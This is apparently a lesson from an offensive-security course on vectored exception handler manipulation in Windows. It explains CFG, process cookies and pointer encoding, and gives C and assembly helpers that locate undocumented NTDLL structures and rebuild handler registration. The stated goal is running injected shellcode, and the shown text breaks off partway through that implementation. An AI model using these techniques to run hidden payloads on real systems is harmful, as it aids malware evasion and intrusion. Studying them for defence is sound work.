      <div id="height-container" class="flex h-full min-h-[800px]">
          <div class="flex max-w-full min-w-full">
              <div class="flex-1 min-w-0">
                  
                  <div id="description-container" class="viewer code-description h-full w-full bg-gray-800/70 backdrop-blur-md backdrop-saturate-150 p-4 px-5 md:px-10 lg:px-20 border border-t-0 border-gray-600/60 shadow-inner">

    
    <div id="module-skeleton" role="status" aria-live="polite" class="absolute inset-0 z-20 overflow-hidden bg-slate-900/70 ring-1 ring-white/10">
    <div class="h-full w-full max-w-5xl mx-auto py-8 animate-pulse motion-reduce:animate-none flex flex-col">

        
        <div class="flex flex-col items-center gap-3">
        <div class="h-7 w-72 rounded-xl bg-white/15"></div>
        <div class="h-px w-full bg-white/10"></div>
        </div>

        
        <div class="h-6 w-40 rounded-lg bg-white/12"></div>

        
        <div class="space-y-3 mb-6">
        <div class="h-4 w-full rounded-lg bg-white/10"></div>
        <div class="h-4 w-11/12 rounded-lg bg-white/10"></div>
        <div class="h-4 w-10/12 rounded-lg bg-white/10"></div>
        <div class="h-4 w-9/12  rounded-lg bg-white/10"></div>
        </div>

        
        <div class="h-56 md:h-72 lg:h-80 rounded-xl bg-white/5 ring-1 ring-white/10 flex items-center justify-center">
        <svg viewBox="0 0 64 64" aria-hidden="true" class="w-12 h-12 text-white/30" fill="none" stroke="currentColor" stroke-width="2">
            <rect x="8" y="14" width="48" height="36" rx="3" class="opacity-30"></rect>
            <circle cx="26" cy="28" r="5"></circle>
            <path d="M16 46l12-14 8 10 8-8 12 12"></path>
        </svg>
        </div>

        
        <div class="mt-6 flex-1 relative rounded-xl overflow-hidden">
        <div class="absolute inset-0 rounded-xl" style="
            background:
                linear-gradient(to right, transparent 0, transparent 8px, rgba(255,255,255,0.00) 8px, rgba(255,255,255,0.00) calc(100% - 8px), transparent 100%),
                repeating-linear-gradient(
                to bottom,
                rgba(255,255,255,0.10),                 /* line color */
                rgba(255,255,255,0.10) 12px,            /* line thickness */
                rgba(255,255,255,0.00) 12px,            /* gap start */
                rgba(255,255,255,0.00) 22px             /* gap height */
                );
            ">
        </div>
        </div>

    </div>
    </div>


    
    

    
    <div id="module-content" class="opacity-0 transition-opacity duration-300">
        <h2>Introduction to Vectored Handler Manipulation</h2>
<h3>Introduction</h3>
<p>Throughout this course, we've explored several use cases for Vectored
 Exception Handlers (VEH), which were first introduced in the <a href="./9">Utilizing Hardware Breakpoints For Hooking (1)</a>
 module. In this module, we'll examine another use for VEH, that is code
 execution. We will introduce how to manipulate VEH to force the 
execution of our own exception-handling routine, which can be a 
shellcode payload for example (this is showcased in a later module).</p>
<p>Furthermore, this module will also take <a href="https://learn.microsoft.com/en-us/windows/win32/secbp/control-flow-guard">Control Flow Guard (CFG)</a>
 into consideration where applicable due to its wide-spread adoption in 
various programs and to demonstrate the role it plays when dealing with 
vectored handlers.</p>
<h3>The Control Flow Guard (CFG)</h3>
<p>Control Flow Guard (CFG) is a security feature implemented in modern 
Windows operating systems to help mitigate exploitation techniques that 
hijack the execution flow of software. Introduced by Microsoft, CFG 
works by performing runtime checks on indirect function calls, ensuring 
that they only target legitimate code paths predetermined at compile 
time. This mechanism is particularly effective against common memory 
corruption attacks, such as buffer overflows, which aim to redirect a 
programs execution to malicious code.</p>
<p>To demonstrate how CFG works, consider the following C program, where
 a function pointer is assigned to a valid function at compile time, 
ensuring that only this legitimate function is called during runtime:</p>
<pre><code class="language-C">#include &lt;stdio.h&gt;

typedef int (*operation)(int, int);

int add(int a, int b) {
    return a + b;
}

int main(void) {
    operation op = add;  // Valid function pointer assignment
    int result = op(3, 4); // Indirect call verified by CFG
    printf("[&gt;] Result: %d\n", result);
    return 0;
}
</code></pre>
<p>With CFG enabled, if an attacker attempts to alter the function pointer <code>op</code>
 to redirect execution to malicious code, the runtime check will detect 
that the new target is not part of the valid set of functions 
predetermined at compile time. This prevention mechanism stops the 
malicious code from being executed, illustrating how CFG contributes to 
the overall security of the system. For more details on CFG, refer to 
the following resources:</p>
<ul>
<li>
<p><a href="https://www.blackhat.com/docs/us-15/materials/us-15-Zhang-Bypass-Control-Flow-Guard-Comprehensively-wp.pdf">Bypass Control Flow Guard Comprehensively</a></p>
</li>
<li>
<p><a href="https://dl.acm.org/doi/fullHtml/10.1145/3664476.3670432">Analysis of the Windows Control Flow Guard</a></p>
</li>
</ul>
<h3>The Types of Vectored Handlers</h3>
<p>In Windows exception handling, there are two primary types of vectored handlers:</p>
<ul>
<li>
<p>Vectored Exception Handler (VEH) - Executed immediately when an 
exception occurs. This handler type has already been extensively covered
 in previous modules throughout the course. To register a VEH, one can 
call the <a href="https://learn.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-addvectoredexceptionhandler">AddVectoredExceptionHandler</a> API.</p>
</li>
<li>
<p>Vectored Continue Handler (VCH) - Executed after a VEH has processed an exception, returned <code>EXCEPTION_CONTINUE_EXECUTION</code> and just before the program resumes normal execution. To register a VCH, one can call the <a href="https://learn.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-addvectoredcontinuehandler">AddVectoredContinueHandler</a> API.</p>
</li>
</ul>
<p>While VEH handlers give you control as soon as an exception is 
triggered, VCH handlers are designed for scenarios where you might need 
additional processing or cleanup tasks after standard exception handling
 has finished but before regular execution continues. Typical uses of 
VCH handlers include performing additional logging or auditing after 
exceptions, cleaning up resources that may have been modified by 
previous handlers, and implementing advanced debugging or 
instrumentation techniques, as they allow for inspection or modification
 of the program state right before continuing execution.</p>
<h3>The Vectored Handler List</h3>
<p>Both VEH and VCH handlers are stored internally in a linked list named <code>LdrpVectorHandlerList</code> that resides in the <code>.mrdata</code> section, also known as the <code>Mutable Read Only Data</code> of NTDLL. The <code>LdrpVectorHandlerList</code> linked list is a list of the following structure:</p>
<pre><code class="language-C">typedef struct _VECTORED_HANDLER_LIST
{
    PVOID                   LockVEH;
    VECTORED_HANDLER_ENTRY* FirstVEH;
    VECTORED_HANDLER_ENTRY* LastVEH;
    PVOID                   LockVCH;
    VECTORED_HANDLER_ENTRY* FirstVCH;
    VECTORED_HANDLER_ENTRY* LastVCH;
};
</code></pre>
<p>The members of the structure are explained below:</p>
<ul>
<li>
<p><code>LockVEH</code> - <a href="https://learn.microsoft.com/en-us/windows/win32/Sync/slim-reader-writer--srw--locks">Slim reader/writer lock</a> used to manage concurrent access to the VEH linked list.</p>
</li>
<li>
<p><code>FirstVEH</code> - Pointer to the first entry in the VEH linked list.</p>
</li>
<li>
<p><code>LastVEH</code> - Pointer to the last entry in the VEH linked list.</p>
</li>
<li>
<p><code>LockVCH</code> - <a href="https://learn.microsoft.com/en-us/windows/win32/Sync/slim-reader-writer--srw--locks">Slim reader/writer lock</a> used to manage concurrent access to the VCH linked list.</p>
</li>
<li>
<p><code>FirstVCH</code> - Pointer to the first entry in the VCH linked list.</p>
</li>
<li>
<p><code>LastVCH</code> - Pointer to the last entry in the VCH linked list.</p>
</li>
</ul>
<h3>Vectored Handler Entries</h3>
<p>Each vectored entry stored in <code>LdrpVectorHandlerList</code> is represented as <code>VECTORED_HANDLER_ENTRY</code> which is declared as the following:</p>
<pre><code class="language-c">typedef struct _VECTORED_HANDLER_ENTRY
{
    LIST_ENTRY  Entry;
    PVOID       Refs;
    PVOID       Unused;
    PVOID       VectoredHandler;
};
</code></pre>
<p>The members of the <code>VECTORED_HANDLER_ENTRY</code> structure are explained below:</p>
<ul>
<li>
<p><code>Entry</code> - Pointers to forward and backwards links.</p>
</li>
<li>
<p><code>Refs</code> - Pointer to a pointer-sized variable that holds the reference count (must be 1).</p>
</li>
<li>
<p><code>VectoredHandler</code> - Encoded pointer to the handler function registered. Encoded pointers are explained in the following section.</p>
</li>
</ul>
<p>By default, vectored handler entries are stored on the process's 
heap. In the image below, we compare the output from WinDbg to Process 
Hacker to show that the address <code>000001ebd8318800</code> is located in a RW committed heap address</p>
<img src="69_files/nocfg-entries.png" style="margin:auto" width="1200px">
<p>However, when CFG is enabled in a process and it registers a vectored handler, it will call <a href="https://doxygen.reactos.org/d5/d55/vectoreh_8c.html#ac8c67f59400a1c0c04d343a61d1fd40f">RtlpAddVectoredHandler</a> that will check if <code>LdrpMrdataHeap</code> is present by calling another function named <code>LdrEnsureMrdataHeapExists</code>. This function, as the name suggests, checks if <code>LdrpMrdataHeap</code> is already present.</p>
<p>If <code>LdrpMrdataHeap</code> is not present, it will allocate 64kb of memory with <code>NtAllocateVirtualMemory</code>, create <code>LdrpMrdataHeap</code> by calling <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-rtlcreateheap">RtlCreateHeap</a>, and then make it "Read-Only" by calling <a href="http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FMemory%20Management%2FHeap%20Memory%2FRtlProtectHeap.html">RtlProtectHeap</a>.</p>
<p>Registered vectored handlers will then be placed into an 8kb region within the allocated 64kb memory allocated previously.</p>
<img src="69_files/cfg-entry.png" style="margin:auto" width="1200px">
<blockquote>
<p>Note that on newer 24H2 builds, this chunk can also be 24kb instead of 8kb.</p>
</blockquote>
<h3>Implementing Code Injection Logic</h3>
<p>In order for us to utilize VEH entries manipulation for code 
execution, we will first need to insert an entry or modify an existing 
one in <code>LdrpVectorHandlerList</code> that will reference our 
payload. A VEH triggering event will invoke our entry after that, 
effectively executing our payload. However, while attempting to do so, 
we will run into CFG and the <em>encoded pointers</em> issue, which is discussed later in the module.</p>
<p>For a more stable and robust implementation, we will attempt to replicate the <code>AddVectoredExceptionHandler</code> and <code>AddVectoredContinueHandler</code> APIs to fully control the registration process.</p>
<h3>Process Cookies</h3>
<p>A process cookie in Windows is a per-process secret value used to 
obfuscate pointer values for security. It is essentially a random 
integer generated at process initialization (or on first use) and unique
 to each process. The Windows OS produces this cookie using various 
unpredictable inputs (e.g. system timers, counters, interrupt times) to 
ensure randomness.</p>
<p>Windows provides APIs like <a href="https://learn.microsoft.com/en-us/previous-versions/bb432254(v=vs.85)">EncodePointer</a> and <a href="https://learn.microsoft.com/en-us/previous-versions/bb432242(v=vs.85)">DecodePointer</a> to hide actual pointer values by encoding them with the processs cookie. For cross-process pointer encoding and decoding, <a href="https://learn.microsoft.com/en-us/previous-versions/dn877135(v=vs.85)">EncodePointerRemote</a> and <a href="https://learn.microsoft.com/en-us/previous-versions/dn877133(v=vs.85)">DecodePointerRemote</a> are also provided. Internally, these APIs call the NTDLL routines <a href="https://ntdoc.m417z.com/rtlencodepointer">RtlEncodePointer</a>, <a href="https://ntdoc.m417z.com/rtldecodepointer">RtlDecodePointer</a>, <a href="https://ntdoc.m417z.com/rtlencoderemotepointer">RtlEncodePointerRemote</a> and <a href="https://ntdoc.m417z.com/rtldecoderemotepointer">RtlDecodePointerRemote</a> respectively, which implement the actual mechanism.</p>
<p>The encoding scheme is simple but effective: it combines the pointer 
value with the secret cookie (usually via an XOR operation and bit 
rotation). In other words, to encode a pointer, the OS will XOR the 
pointer with the cookie and then rotate the bits by an amount derived 
from the cookie (for example, rotating right by the lower 6 bits of the 
cookie). The decode operation reverses this (rotate in the opposite 
direction and XOR with the same cookie) to retrieve the original 
pointer. This means the encoded pointer is process-specific and only 
code running in the same process and cookie can decode it properly. If 
an attacker reads an encoded function pointer from a process, it will be
 meaningless without the cookie. Likewise, if malware tries to overwrite
 a protected pointer with a raw address, the program will attempt to 
decode it and end up with an incorrect value, leading to a crash instead
 of a successful exploit</p>
<p>Under the hood, all of the aforementioned functions retrieve the 
process cookie in whose context the pointer needs to be valid. A 
combination of bitwise <code>AND</code>, <code>XOR</code>, <a href="https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/rotl-rotl64-rotr-rotr64?view=msvc-170">__rotr64 and __rotl64</a> are used for encoding/decodng purposes.</p>
<h3>Obtaining a Process's Cookie</h3>
<p>To retrieve a process's cookie, one can call the <a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess">NtQueryInformationProcess</a> syscall with the <code>ProcessCookie</code> information class. The cookie is stored in a <code>DWORD</code>
 variable as shown in the following snippet. Furthermore, it is 
important to note that a process cookie can only be obtained if the 
process handle is fetched with the <code>PROCESS_ALL_ACCESS</code> flag.</p>
<pre><code class="language-C">NtQueryInformationProcess(
	hProcess,      // Handle with PROCESS_ALL_ACCESS
	ProcessCookie, // InformationClass for cookie retrieval
	&amp;dwCookie,     // Pointer to a DWORD variable that receives the cookie
	sizeof(DWORD),
	&amp;retLength
);
</code></pre>
<p>With a process cookie, encoding/decoding a pointer manually can be achieved with the following functions:</p>
<pre><code class="language-C">PVOID DecodePointers(PVOID ptr, DWORD dwCookie) {
	return (PVOID)(RotateRight64((ULONG_PTR)ptr, 0x40 - (dwCookie &amp; 0x3f)) ^ dwCookie);
}

PVOID EncodePointers(PVOID ptr, DWORD dwCookie) {
	return (PVOID)(RotateLeft64((ULONG_PTR)ptr ^ dwCookie, 0x40 - (dwCookie &amp; 0x3f)));
}
</code></pre>
<br>
<h3>The GetVectoredHandlerList Function</h3>
<p>In order to manipulate the VEH list (<code>LdrpVectorHandlerList</code>)
 and have it execute our own payload, we need first to fetch it. 
Unfortunately, there is no documented or undocumented function to 
retrieve the <code>LdrpVectorHandlerList</code> list from a process, however, one can find it being mentioned in several internal functions, as shown below:</p>
<img src="69_files/m1-list-refs.png" style="margin:auto" width="1200px">
<p>Therefore we will use one of these functions as a reference to start the search for <code>LdrpVectorHandlerList</code>'s address. For that, we will construct a function named <code>GetVectoredHandlerList</code> that uses <code>RtlRemoveVectoredExceptionHandler</code>'s pointer as a reference to start the search. Within <code>RtlRemoveVectoredExceptionHandler</code>, <code>LdrpVectorHandlerList</code> can be seen in the following instruction:</p>
<img src="69_files/ldrpvectorhandlerlist1.png" style="margin:auto" width="1200px">
<p>Where it computes and stores the pointer to <code>LdrpVectorHandlerList</code> in the <code>r12</code> register. Therefore, our <code>GetVectoredHandlerList</code> function should search for the <code>lea r12, LdrpVectorHandlerList</code> instruction, shown in the image above, to find the address of the <code>LdrpVectorHandlerList</code> list. The function searches for the <code>258d4c</code> byte sequence, which represents the instruction in Little-Endian.</p>
<img src="69_files/ldrpvectorhandlerlist2.png" style="margin:auto" width="1200px">
<p><code>GetVectoredHandlerList</code> accepts the following parameters:</p>
<ul>
<li>
<p><code>hNtdll</code> - The base address of <code>ntdll.dll</code>.</p>
</li>
<li>
<p><code>pLdrpVectorHandlerList</code> - A pointer to a <code>PVOID</code> variable that will receive the address of <code>LdrpVectorHandlerList</code>.</p>
</li>
</ul>
<pre><code class="language-C">BOOL GetVectoredHandlerList(IN HMODULE hNtdll, OUT PVOID* pLdrpVectorHandlerList) {

	// Reference function
	ULONG64 ptr = (ULONG64)GetProcAddress(hNtdll, "RtlRemoveVectoredExceptionHandler");

	if (!ptr) {
		printf("[!] Error Obtaining Reference Function - GetProcAddress Failed With Error : %ld \n", GetLastError());
		return FALSE;
	}

	while (*(BYTE*)ptr != 0xcc) {

		// "jmp"
		if (*(BYTE*)ptr == 0xe9) {

			// Following the 'jmp'
			ptr = ptr + 5 + *(int*)(ptr + 1);

			// "lea r12,[ntdll!LdrpVectorHandlerList]"
			while (((*(ULONG*)ptr) &amp; 0xffffff) != 0x258d4c) {
				ptr = ptr + 1;
			}

			// Extract the 4-byte displacement and get ntdll!LdrpVectorHandlerList
			*pLdrpVectorHandlerList = ptr + 7 + *(int*)(ptr + 3);
			return TRUE;
		}

		ptr = ptr + 1;
	}

	return FALSE;
}
</code></pre>
<br>
<h4>The GetLdrProtectMrdata Function</h4>
<p>When manually modifying the <code>LdrpVectoredHandlerList</code> located in the <code>.mrdata</code> section, it is essential to first obtain the <code>LdrpMrdataLock</code> lock.  This lock is a <a href="https://learn.microsoft.com/en-us/windows/win32/Sync/slim-reader-writer--srw--locks">slim reader/writer lock</a> designed to provide exclusive access to the <code>.mrdata</code>
 segment during modifications. Acquiring this lock guarantees that no 
other threads can interfere with the data while we perform our edits, 
thus ensuring the integrity of the modifications and preventing 
potential race conditions.</p>
<p>Fortunately, there is a function called <code>LdrProtectMrdata</code> that automates this process. Not only does it handle acquiring the lock, but it also wraps around the <code>NtProtectVirtualMemory</code> API to adjust the memory protections for <code>.mrdata</code> appropriately. Internally used by the Windows loader during process initialization, <code>LdrProtectMrdata</code>
 is also utilized by other native or internal APIs to ensure that memory
 regions critical to process operation are safely protected during 
dynamic modifications.</p>
<p>The function <code>GetLdrProtectMrdata</code> is employed to locate the address of <code>LdrProtectMrdata</code> in memory by using <code>RtlDeleteFunctionTable</code> as a reference point.</p>
<img src="69_files/call_ldrprotectmrdata.png" style="margin:auto" width="1200px">
<p>It accepts the following parameters:</p>
<ul>
<li>
<p><code>hNtdll</code> - The base address of <code>ntdll.dll</code>.</p>
</li>
<li>
<p><code>pLdrProtectMrdata</code> - A pointer to a <code>PVOID</code> variable that will receive the address of <code>LdrProtectMrdata</code>.</p>
</li>
</ul>
<pre><code class="language-C">BOOL GetLdrProtectMrdata(IN HMODULE hNtdll, OUT PVOID* pLdrProtectMrdata) {

	BYTE* ptr = (BYTE*)GetProcAddress(hNtdll, "RtlDeleteFunctionTable");

	if (!ptr) {
		PRINT_WINAPI_ERR("GetProcAddress");
		return FALSE;
	}

	while (TRUE) {

		// Start of "call ntdll!LdrProtectMrdata"
		if (*ptr == 0xe8) {

			int offset = *(int*)(ptr + 1);
			// Retrn "ntdll!LdrProtectMrdata"
			*pLdrProtectMrdata = (PVOID)((ULONG_PTR)(ptr + 5) + offset);
			return TRUE;
		}

		ptr++;
	}

	return FALSE;
}
</code></pre>
<br>
<h4>The GetLdrpMrdataHeap Function</h4>
<p>To ensure compatibility between our custom implementations of <code>AddVectoredExceptionHandler</code> and <code>AddVectoredContinueHandler</code> and the original functions, it is essential to use <code>LdrpMrdataHeap</code>, a heap that is responsible for managing the memory for vectored handlers. <code>LdrpMrdataHeap</code>
 plays a critical role when CFG is enabled. Furthermore, in scenarios 
where a vectored handler is registered either before or after your 
custom implementation is active, <code>LdrpMrdataHeap</code> helps maintain a consistent memory layout and ensures that handlers are managed correctly.</p>
<p>Our custom versions of the <code>AddVectoredExceptionHandler</code> and <code>AddVectoredContinueHandler</code> functions must consider all cases, especially those involving CFG, and using <code>LdrpMrdataHeap</code> automatically handles these nuances. Essentially, <code>LdrpMrdataHeap</code>
 abstracts away the underlying complexities of memory management related
 to vectored handlers under CFG, making the custom implementations 
function seamlessly alongside the original API behavior.</p>
<p>To locate the address of <code>LdrpMrdataHeap</code>, the function <code>GetLdrpMrdataHeap</code> is constructed. This function searches for <code>LdrpMrdataHeap</code> by using <a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/nf-winnt-rtladdfunctiontable">RtlAddFunctionTable</a> as a reference point.</p>
<img src="69_files/getldrpmrdataheap.png" style="margin:auto" width="1200px">
<p>The function accepts the following parameters:</p>
<ul>
<li>
<p><code>hNtdll</code> - The base address of <code>ntdll.dll</code>.</p>
</li>
<li>
<p><code>pLdrpMrdataHeap</code> - A pointer to a <code>PVOID</code> variable that will receive the address of <code>LdrpMrdataHeap</code>.</p>
</li>
</ul>
<pre><code class="language-C">BOOL GetLdrpMrdataHeap(IN HMODULE hNtdll, OUT PVOID* pLdrpMrdataHeap) {

	// Get reference function
	ULONG64 ptr = (ULONG64)GetProcAddress(hNtdll, "RtlAddFunctionTable");

	if (!ptr) {
		PRINT_WINAPI_ERR("GetProcAddress");
		return FALSE;
	}

	// Scan till a "mov rcx, [ntdll!LdrpMrdataHeap]"
	while (((*(ULONG*)ptr) &amp; 0xffffff) != 0x0d8b48) {
		ptr = ptr + 1;
	}

	// extract the 4-byte displacement and get "ntdll!LdrpMrdataHeap"
	*pLdrpMrdataHeap = ptr + 7 + *(int*)(ptr + 3);
	return TRUE;
}
</code></pre>
<br>
<h4>The GetLdrEnsureMrdataHeapExists Function</h4>
<p>When CFG is enabled, Windows calls <code>LdrEnsureMrdataHeapExists</code> to guarantee that the <code>LdrpMrdataHeap</code>
 is properly initialized and available. This function ensures that the 
memory management infrastructure for vectored exception and continue 
handlers is set up before any handler modifications occur, which is 
critical in CFG-enabled environments to maintain security and system 
stability.</p>
<p>The <code>GetLdrEnsureMrdataHeapExists</code> function shown below, searches for the location of <code>LdrEnsureMrdataHeapExists</code> using <code>RtlAddFunctionTable</code> as a reference point.</p>
<img src="69_files/getldrensuremrdataheapexists.png" style="margin:auto" width="1200px">
<p><code>GetLdrEnsureMrdataHeapExists</code> accepts the following parameters:</p>
<ul>
<li>
<p><code>hNtdll</code> - The base address of <code>ntdll.dll</code>.</p>
</li>
<li>
<p><code>pLdrEnsureMrdataHeapExists</code> - A pointer to a <code>PVOID</code> variable that will receive the location of <code>LdrEnsureMrdataHeapExists</code>.</p>
</li>
</ul>
<pre><code class="language-C">BOOL GetLdrEnsureMrdataHeapExists(IN HMODULE hNtdll, OUT PVOID* pLdrEnsureMrdataHeapExists) {

	BYTE* ptr = (BYTE*)GetProcAddress(hNtdll, "RtlAddFunctionTable");

	if (!ptr) {
		PRINT_WINAPI_ERR("GetProcAddress");
		return FALSE;
	}

	while (TRUE) {

		// Start of "call ntdll!LdrEnsureMrdataHeapExists"
		if (*ptr == 0xe8) {

			int offset = *(int*)(ptr + 1);
			// Return "ntdll!LdrEnsureMrdataHeapExists"
			*pLdrEnsureMrdataHeapExists = (PVOID)((ULONG_PTR)(ptr + 5) + offset);
			return TRUE;
		}

		ptr++;
	}

	return FALSE;
}
</code></pre>
<br>
<h4>The FlipBit Function</h4>
<p>When a process registers a VEH or VCH, Windows updates the <code>PEB.CrossProcessFlags</code> field by setting the corresponding <code>ProcessUsingVEH</code> or <code>ProcessUsingVCH</code>
 bits. This action informs the operating system that the process is 
actively utilizing vectored handlers, which ensures that any exceptions 
encountered are correctly forwarded to these handlers. By setting these 
flags, Windows can accurately manage exception routing and guarantee 
that the registered handlers are invoked, thereby playing a critical 
role in the processs exception handling and overall security framework.</p>
<p>The <code>FlipBit</code> function, as its name implies, toggles one of these bits using the provided bitmask.</p>
<pre><code class="language-asm">FlipBit proc

	xor rax, rax
	xor rdx, rdx
	mov rdx, qword ptr gs:[60h]		; get the address of our PEB
	bsf rax, rcx					; get the bit position based on the bitmask provided
	btc dword ptr [rdx+50h], eax	; flip the bit in CrossProcessFlags
	ret

FlipBit endp
</code></pre>
<p>Bitmasks that will be used with this function are as follows:</p>
<pre><code class="language-C">#define PROCESS_USING_VEH 0x4		// Indicates that the process is using vectored exception handlers.
#define PROCESS_USING_VCH 0x8		// Indicates that the process is using vectored continue handlers.
</code></pre>
<p>By flipping these bits appropriately, the <code>FlipBit</code> 
function ensures that the operating system is aware of the process's use
 of vectored handlers, which is critical for proper exception handling.</p>
<h3>Handling Control Flow Guard (CFG)</h3>
<p>CFG is integral to managing where vectored handler entries are 
stored, and thus, several helper functions or wrappers are employed to 
interact with its configuration. This section details one such helper 
function that determines whether CFG is enabled for a given process.</p>
<h4>The CheckCFGStatus Function</h4>
<p>The <code>CheckCFGStatus</code> function is designed to verify if CFG is active for a specific process. It achieves this by invoking the WinAPI function <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getprocessmitigationpolicy">GetProcessMitigationPolicy</a> along with the <a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-process_mitigation_control_flow_guard_policy">ProcessControlFlowGuardPolicy</a>
 structure. This structure provides detailed information regarding the 
CFG settings for the process. Essentially, the function retrieves the 
CFG configuration and returns a Boolean value indicating whether CFG is 
enabled. <code>CheckCFGStatus</code> require a single parameter:</p>
<ul>
<li><code>hProcess</code> - A handle to the process for which the CFG 
status is being queried. This handle is used by the API to identify and 
access the appropriate process. The <code>CheckCFGStatus</code> function is shown below:</li>
</ul>
<pre><code class="language-C">BOOL CheckCFGStatus(IN HANDLE hProcess) {
    PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY ProcCfg = { 0 };

    // Retrieve the CFG policy for the specified process
    GetProcessMitigationPolicy(hProcess, ProcessControlFlowGuardPolicy, &amp;ProcCfg, sizeof(ProcCfg));

    // Return whether CFG is enabled
    return ProcCfg.EnableControlFlowGuard;
}
</code></pre>
<br>
<h4>The LdrProtectMrdataWrapper Function</h4>
<p>The <code>LdrProtectMrdataWrapper</code> function shown below acts as a simple wrapper that indirectly jumps to the <code>LdrProtectMrdata</code> function instead of calling it directly. This indirect approach is necessary because <code>LdrProtectMrdata</code>
 is a dynamically resolved internal function whose starting address is 
not guaranteed to be 16-byte aligned. When CFG is enabled, a direct call
 to this function could trigger a <code>FAST_FAIL_GUARD_ICALL_CHECK_FAILURE</code>
 error due to misalignment. To address this issue with minimal overhead,
 the wrapper employs an indirect jump. This technique will also be 
applied to other internal functions used throughout the module to 
maintain consistency and avoid similar CFG-related issues.</p>
<p>The <code>LdrProtectMrdataWrapper</code> function will be called with the following parameters:</p>
<ul>
<li><code>BOOL</code> - A flag determining the protection state of the <code>.mrdata</code> section. Passing <code>FALSE</code> makes it read-write (RW), whereas <code>TRUE</code> makes it "Read-Only".</li>
<li><code>PVOID</code> - The address of <code>LdrProtectMrdata</code>.</li>
</ul>
<pre><code class="language-asm">LdrProtectMrdataWrapper proc

	xor rax, rax
	jmp rdx

LdrProtectMrdataWrapper endp
</code></pre>
<br>
<h4>The RtlProtectHeapWrapper Function</h4>
<p>The <code>RtlProtectHeapWrapper</code> function serves as an indirect wrapper for calling the <a href="https://ntdoc.m417z.com/rtlprotectheap">RtlProtectHeap</a> function. Similar to the previous wrapper (<code>LdrProtectMrdataWrapper</code>),
 it avoids directly calling the internal function due to potential CFG 
issues caused by misaligned function addresses. Instead, the wrapper 
utilizes an indirect jump to minimize overhead while ensuring 
compatibility when CFG is enabled.</p>
<p>The <code>RtlProtectHeapWrapper</code> function will be called with the following parameters:</p>
<ul>
<li>
<p><code>PVOID</code> - A pointer to <code>LdrpMrdataHeap</code> heap.</p>
</li>
<li>
<p><code>BOOL</code> - A flag determining the protection state of the <code>.mrdata</code> section. Passing <code>FALSE</code> makes it read-write (RW), whereas <code>TRUE</code> makes it "Read-Only".</p>
</li>
<li>
<p><code>PVOID</code> - The address of <code>RtlProtectHeap</code>.</p>
</li>
</ul>
<pre><code class="language-asm">RtlProtectHeapWrapper proc

	xor rax, rax
	jmp r8

RtlProtectHeapWrapper endp
</code></pre>
<br>
<h4>The LdrEnsureMrdataHeapExistsWrapper Function</h4>
<p>The <code>LdrEnsureMrdataHeapExistsWrapper</code> function is another wrapper that indirectly jumps to the <code>LdrEnsureMrdataHeapExists</code> function. Its purpose is to ensure that the <code>.mrdata</code> heap is initialized, while maintaining compatibility with CFG by avoiding a direct call to the internal function. <code>LdrEnsureMrdataHeapExistsWrapper</code> requires a single parameter:</p>
<ul>
<li><code>PVOID</code> - The Address of <code>LdrEnsureMrdataHeapExists</code>.</li>
</ul>
<pre><code class="language-asm">LdrEnsureMrdataHeapExistsWrapper proc

	xor rax, rax
	jmp rcx

LdrEnsureMrdataHeapExistsWrapper endp
</code></pre>
<p>All of the previously discussed assembly wrappers are declared in our C source file using the <code>extern</code> keyword.</p>
<pre><code class="language-c">extern void FlipBit(ULONG);
extern void LdrProtectMrdataWrapper(BOOL, PVOID);
extern void LdrEnsureMrdataHeapExistsWrapper(PVOID);
extern void RtlProtectHeapWrapper(PVOID, BOOL, PVOID);
</code></pre>
<br>
<h3>The AddVectoredExceptionHandlerReplacement And AddVectoredContinueHandlerReplacement Functions</h3>
<p>This section will demonstrate the manual addition of both types of vectored handlers. The replacement functions <code>AddVectoredExceptionHandler</code> and <code>AddVectoredContinueHandler</code> will be named <code>AddVectoredExceptionHandlerReplacement</code> and <code>AddVectoredContinueHandlerReplacement</code> respectively which will follow the below steps:</p>
<ol>
<li>
<p>Resolve the address of <code>LdrpVectorHandlerList</code>.</p>
</li>
<li>
<p>Resolve the address of <code>LdrProtectMrdata</code>.</p>
</li>
<li>
<p>If CFG is enabled, determine the address of <code>LdrpMrdataHeap</code>.</p>
</li>
<li>
<p>If CFG is enabled, determine the address of <code>LdrEnsureMrdataHeapExists</code>.</p>
</li>
<li>
<p>Verify whether <code>LdrpMrdataHeap</code> is already allocated; if it isn't, invoke <code>LdrEnsureMrdataHeapExists</code> to create it.</p>
</li>
<li>
<p>Allocate a <code>VECTORED_HANDLER_ENTRY</code> either on the default heap or, if CFG is active, on <code>LdrpMrdataHeap</code>.</p>
</li>
<li>
<p>Check if the handler list is empty and update the corresponding flag in <code>PEB.CrossProcessFlags</code> accordingly.</p>
</li>
<li>
<p>Modify <code>LdrpVectorHandlerList</code> and/or adjust existing entries as required.</p>
</li>
</ol>
<br>
<h4>Resolving The Location Of Internal Functions And Variables</h4>
<p>The first step when it comes to vectored handler manipulation is resolving the location of <code>LdrpVectorHandlerList</code>.
 As previously mentioned, this variable holds everything related to 
registered vectored handlers in a process and is, therefore, the first 
thing we need to obtain. Besides <code>LdrpVectorHandlerList</code>, <code>LdrProtectMrdata</code> will also be obtained to edit the memory protection of <code>.mrdata</code> to be able to edit <code>LdrpVectorHandlerList</code>. It is also possible to acquire <code>LdrpMrdataLock</code> and call <code>NtProtectVirtualMemory</code> ourselves; however, for minimum overhead, <code>LdrProtectMrdata</code> will be used.</p>
<pre><code class="language-C">fnLdrProtectMrdata		pLdrProtectMrdata		= NULL;
VECTORED_HANDLER_LIST*	pLdrpVectorHandlerList	= NULL;
HMODULE					hNtdll					= GetModuleHandle(TEXT("NTDLL.DLL"));

if (!GetVectoredHandlerList(hNtdll, &amp;pLdrpVectorHandlerList)) {
	printf("[!] Failed to Get LdrpVectorHandlerList \n");
	return NULL;
}

printf("[i] LdrpVectorHandlerList @ 0x%p\n", pLdrpVectorHandlerList);

